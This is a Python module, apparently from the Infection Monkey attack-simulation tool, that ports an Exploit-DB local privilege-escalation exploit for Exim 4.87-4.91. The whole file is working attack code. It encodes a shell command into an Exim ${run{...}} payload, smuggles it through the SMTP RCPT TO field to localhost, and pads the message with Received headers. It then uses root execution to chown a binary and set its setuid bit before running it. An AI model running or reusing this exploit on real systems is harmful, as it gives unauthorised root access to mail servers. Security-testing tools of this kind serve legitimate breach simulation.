"""
    Implementation is based on Exim 4.87 - 4.91 - Local Privilege Escalation
    https://www.exploit-db.com/exploits/46996
    Exim 4.87 - 4.91 is vulnerable
"""
import re
import os
import socket
from infection_monkey.pe import HostPrivExploiter
from logging import getLogger

LOG = getLogger(__name__)

__author__ = "D3fa1t"

RUN_PAYLOAD=r"${run{\x2fbin\x2fsh\t-c\t\x22COMMAND_HERE\x22}}@localhost"  # payload with placeholder
CHOWN_CHMOD= "sudo chown root %(file_path)s && sudo chmod +s root %(file_path)s"
LOCALHOST= "localhost" # local priv escalation
SMTP_PORT= 25   # port to connect to
RECV_128 = 128  # In Bytes


def shell(cmd):
    """
    To run the command on the shell and to read the output.
    :param cmd: The commands to be run on the shell
    :return: returns the output
    """
    try:
        result = os.popen(cmd).read()[:-1]
        return result
    except OSError as e:
        LOG.error("Can't read from the shell!")
        return False


def encode(cmd):
    """
    encodes the command to be run as root and embeds them into the place holder
    :param cmd: encodes the command to be run as root
    :return: cmd encoded in PAYLOAD
    """
    # encoding / and " "
    cmd = re.sub('/', r"\x2f", cmd)
    cmd = re.sub(' ', r"\\t", cmd)
    cmd = "%r"%cmd
    cmd = cmd.strip("'")

    # replacing the place holder with the encoded command
    return re.sub("COMMAND_HERE", cmd, RUN_PAYLOAD)


class eximExploiter(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""

    def socket_send_recv(self, s, message):
        """
        Function to send data and to receive the response with exception handling
        :param s: socket
        :param message: the data that needs to be sent to the socket
        :return: response to the data sent
        """
        try:
            s.send(message)
            return s.recv(RECV_128).decode('utf-8')
        except socket.error as e:
            LOG.error('Failed to send payload to %s', self.host.ip_addr)
        return False

    def socket_send(self, s, message):
        """
        Function to send data to the socket with exception handling
        :param s: socket
        :param message: the data that needs to be sent to the socket
        :return:
        """
        try:
            s.send(message)
            return True
        except socket.error as e:
            LOG.error('Failed to send payload to %s', self.host.ip_addr)
        return False

    def exploit(self, command_line):
        """
        exploit() runs the command as the root user
        :param command_line: Command to be run as root
        :return: False if it is not running Exim
        """

        hostname = shell("hostname -f")
        command = encode(command_line)
        smtp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            smtp_socket.connect((LOCALHOST, SMTP_PORT))
            # Check to verify if the server is Exim
            if "Exim" not in smtp_socket.recv(RECV_128).decode('utf-8'):
                return False
        except socket.error as e:
            LOG.error('Failed to connect to %s', self.host.ip_addr)
            return False

        if not self.socket_send_recv(smtp_socket, "HELO " + hostname + '\n'):
            return False
        if not self.socket_send_recv(smtp_socket, "MAIL FROM:<>\n"):
            return False
        if not self.socket_send_recv(smtp_socket, "RCPT TO:<" + command + ">\n"):
            return False
        if not self.socket_send(smtp_socket, "DATA\n"):
            return False
        for i in range(1, 32):
            if not self.socket_send(smtp_socket, "Received: " + str(i) + "\n"):
                return False
        if not self.socket_send(smtp_socket, "\n"):
            return False
        if not self.socket_send(smtp_socket, ".\n"):
            return False

        return True

    def try_priv_esc(self, command_line):
        """
        Creates a rand file at /tmp as root, if it succeeds then it runs monkey as root user
        :param command_line: The file path of the monkey
        :return: True if  PE is successful and False if it fails
        """
        self.file_path = command_line.split(' ')[0]

        # Change the owner and setuid bit of the monkey
        set_suid_root = CHOWN_CHMOD % {'file_path': self.file_path}
        if not self.exploit(set_suid_root):
            return False

        # check if pe is successful by looking at the owner of the monkey and the sticky bit
        if os.stat(self.file_path).st_uid == 0:
            # Exploit is successful
            if self.exploit(command_line):
                return True

        return False
